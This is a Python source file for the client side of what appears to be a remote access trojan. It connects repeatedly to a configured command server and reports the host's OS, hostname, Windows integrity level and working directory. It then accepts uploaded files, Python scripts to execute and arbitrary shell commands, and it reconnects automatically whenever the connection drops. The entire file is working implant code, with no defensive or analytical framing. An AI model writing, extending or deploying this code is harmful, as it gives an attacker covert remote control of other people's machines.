import inspect
import json
import os
import platform
import socket
import subprocess
import sys
import time

from client.command import Command, get_command_list
from client.config import SERVER_ADDR
from client.server import Server
from common.util import logger, get_write_stream, parse

if os.name == 'nt':
    from client.win32util import get_integrity_level, get_executable_path


class Client:
    def __init__(self, address):
        self.address = address
        self.server = Server()

    def connect(self):
        logger.info(f'Connecting to {self.address}')
        while not self.server.connect(self.address):
            time.sleep(5)
        info = {
            'os': platform.platform(),
            'hostname': socket.gethostname(),
            'integrity': get_integrity_level() if os.name == 'nt' else 'N/A',
            'cwd': os.getcwd(),
            'commands': get_command_list()
        }
        info = json.dumps(info).encode()
        self.server.send(head={'type': 'info', 'length': len(info)}, bytes=info)
        logger.info('Connected')

    def wait(self):
        while True:
            try:
                head = self.server.recv_head()
                id = head['id']
                type = head['type']
                try:
                    result = None
                    if type == 'file':
                        filename = head['filename']
                        self.server.recv_body(head, file_stream=get_write_stream(filename))
                        result = 1, '\nFile uploaded to: {}'.format(os.path.abspath(filename))
                    else:
                        body = self.server.recv_body(head)
                        if type == 'command':
                            result = self.exec_cmd(body, id=id)
                        elif type == 'script':
                            result = Command.pyexec(body, json.loads(head['args']))
                    if result:
                        self.server.send_result(*result, id=id)
                except Exception as e:
                    self.server.send_result(0, str(e) + '\n', id=id)
            except SystemExit:
                logger.info('Server closed this connection')
                break
            except socket.error:
                logger.error('Connection closed')
                self.server.close()
                self.server = Server()
                self.connect()

    def exec_cmd(self, cmd, id):
        Command.server = self.server
        Command.id = id
        cls = Command()
        if cmd == 'kill':
            self.server.close()
            sys.exit(0)
        elif cmd == 'reset':
            subprocess.Popen(get_executable_path())
            self.server.close()
            sys.exit(0)
        cmd_name, cmd_arg = parse(cmd)
        if hasattr(cls, cmd_name):
            func = getattr(cls, cmd_name)
            if not len(inspect.getfullargspec(func).args):
                status, result = func() or (None, None)
            else:
                status, result = func(cmd_arg) or (None, None)
            if None not in [status, result]:
                result += '\n'
                return status, result
        else:
            return cls.shell(cmd)


if __name__ == '__main__':
    client = Client(SERVER_ADDR)
    try:
        client.connect()
        client.wait()
    except KeyboardInterrupt:
        sys.exit(0)
    except Exception as e:
        logger.error(e)
